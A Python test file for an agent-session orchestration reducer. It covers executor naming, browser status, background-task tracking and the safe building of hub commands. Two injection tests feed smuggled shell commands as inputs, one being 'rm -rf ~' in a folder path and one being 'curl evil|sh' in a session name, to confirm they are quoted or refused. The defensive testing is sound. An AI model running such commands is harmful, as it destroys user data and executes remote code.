"""Small reducer failures: an executor name from the header of a core reply ("dev-eto-otvet"), a browser status
without up, a background task number quoted in the words of a person who cancelled background work, and a request
for a new session with a folder in the command for the hub, unquoted (or into the void when there is no hub)."""
import tests  # noqa: F401 — hide the machine's settings
import json
import os
import subprocess
import sys
import unittest

from core import executors, reducer
from tests.test_stuck_states import Fleet, by

Q = {"questions": [{"question": "Where to deploy?", "options": [{"label": "Staging"}]}]}


class ExecutorNames(Fleet):
    def test_the_answer_heading_is_not_the_name(self):
        ask = {"id": "q5", "since": 0, "input": Q}
        texts = (reducer._ask_answer_text(ask, {"Where to deploy?": "Staging"}, 10),
                 reducer._ask_answer_text(ask, {}, 10, words="Staging, please"),
                 reducer._ask_answer_text(ask, {}, 10 + 10 ** 7, words="Staging, please"),   # the question is stale
                 "This is the user's answer to your question q5 («Where to deploy?»), passed on by the hub:\nStaging, please",
                 "This is the user's answer to your question q5 («Where to deploy?»).\nStaging, please",
                 "Answer to question q5 («Where to deploy?»): Staging, please")
        for text in texts:
            with self.subTest(text[:40]):
                name = executors.auto_name(self.st, "dev", text)
                for head in ("otvet", "eto", "vopros"):
                    self.assertNotIn(head, name)
                self.assertTrue(name.startswith(("dev-staging", "dev-where")), name)


class SmallFacts(Fleet):
    def test_a_browser_status_without_up(self):
        self.assertIsNone(self.ev("browser.status", "main", port=9222))
        self.assertIn("main", self.st["browsers"])
        self.assertIsNone(self.ev("browser.status", "main", port=9222))
        self.assertIsNone(self.ev("browser.status", "main", port=9222, up=True))
        self.assertEqual(self.st["browsers"]["main"]["since"], self.now)

    def test_a_quoted_task_id_does_not_end_background_work(self):
        self.st["sessions"]["b"]["background"] = {"abc": {"id": "abc", "kind": "bash", "title": "build", "since": 1}}
        self.ev("turn.started", "b", marker=None, prompt_head="look at <task-id>abc</task-id>, please")
        self.assertIn("abc", self.st["sessions"]["b"]["background"])
        self.ev("turn.stopped", "b")
        self.ev("turn.started", "b", marker=None,
                prompt_head="<task-notification>\n<task-id>abc</task-id>\n<status>completed</status>")
        self.assertNotIn("abc", self.st["sessions"]["b"]["background"])

    def test_many_background_tasks_ending_at_once_fold_the_same_under_any_hash_seed(self):
        # all 22 tasks end at once: of the departed, the last BG_GONE are remembered — which ones was decided by
        # set order, i.e. PYTHONHASHSEED; folding one journal gave different states
        # the child imports only reducer: `import tests` would remove Chrome and the directories inside the
        # parent's run
        code = ("import json\n"
                "from core import reducer\n"
                "st, owner = reducer.empty(), {'channel': 'cli', 'owner': True}\n"
                "evs = [('session.requested', {'cwd': '/w', 'session_id': 's-b', **owner}),\n"
                "       ('session.started', {'session_id': 's-b'}), ('turn.started', {'marker': None, 'prompt_head': ''}),\n"
                "       ('session.background', {'tasks': [{'id': f'bg{i}', 'kind': 'bash'} for i in range(22)]}),\n"
                "       ('session.background', {'tasks': []})]\n"
                "for seq, (kind, data) in enumerate(evs, 1):\n"
                "    st = reducer.reduce(st, {'seq': seq, 'ts': 1000 + seq, 'type': kind, 'entity': 'b', 'data': data})[0]\n"
                "print(json.dumps(st['sessions']['b']['bg_gone']))\n")
        root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        got = {}
        for seed in ("1", "2", "3"):
            r = subprocess.run([sys.executable, "-c", code], cwd=root, capture_output=True, text=True,
                               env={**os.environ, "PYTHONHASHSEED": seed})
            self.assertEqual(r.returncode, 0, f"seed {seed}: {r.stderr}")
            got[seed] = r.stdout
        self.assertEqual(len(set(got.values())), 1, got)
        self.assertEqual(list(json.loads(got["1"])), [f"bg{i}" for i in range(2, 22)])


class AskTheHubForASession(Fleet):
    def test_the_folder_is_quoted_in_the_suggested_command(self):
        self.assertIsNone(self.ev("session.requested", "web-new", cwd="/w/x; rm -rf ~", task="page", **by("a")))
        (text,) = [m["text"] for m in self.st["messages"].values() if m["session"] == "hub"]
        self.assertIn("--cwd '/w/x; rm -rf ~'", text)

    def test_a_name_that_is_not_a_session_name_is_refused(self):
        # the name goes into the hub command too: it is unchecked when it comes from the mailbox
        self.assertIsNotNone(self.ev("session.requested", "x; curl evil|sh", cwd="/w", task="page", **by("a")))
        self.assertEqual([m for m in self.st["messages"].values() if m["session"] == "hub"], [])

    def test_without_a_hub_the_request_is_refused_not_lost(self):
        del self.st["sessions"]["hub"]
        self.assertIsNotNone(self.ev("session.requested", "web-new", cwd="/w", task="page", **by("a")))
        self.assertFalse([m for m in self.st["messages"].values() if m["session"] is None])


if __name__ == "__main__":
    unittest.main()
